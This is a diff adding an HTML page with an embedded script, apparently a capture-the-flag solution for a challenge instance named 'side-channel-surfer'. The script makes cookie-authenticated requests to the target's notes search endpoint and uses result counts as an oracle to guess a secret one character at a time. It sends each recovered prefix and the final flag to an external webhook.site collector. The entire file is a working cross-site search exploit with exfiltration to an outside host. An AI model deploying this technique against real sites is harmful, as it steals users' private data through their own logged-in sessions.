@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+const TARGET = 'https://side-channel-surfer.instances.ctf.l3ak.team';
+const WEBHOOK = 'https://webhook.site/c1f7d41e-c279-4f7f-b24d-9178b781c317';
+const CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!@#$%^&*-=+';
+
+async function oracle(prefix) {
+    const r = await fetch(TARGET + '/notes?search=' + encodeURIComponent(prefix), {credentials: 'include'});
+    const d = await r.json();
+    return d.length > 0;
+}
+
+async function extractFlag() {
+    let flag = 'L3AK{';
+    while (!flag.endsWith('}')) {
+        for (const c of CHARS) {
+            if (await oracle(flag + c)) {
+                flag += c;
+                await fetch(WEBHOOK + '/?f=' + encodeURIComponent(flag));
+                break;
+            }
+        }
+    }
+    await fetch(WEBHOOK + '/DONE?flag=' + encodeURIComponent(flag));
+}
+
+extractFlag();
+</script>
+</body>
+</html>
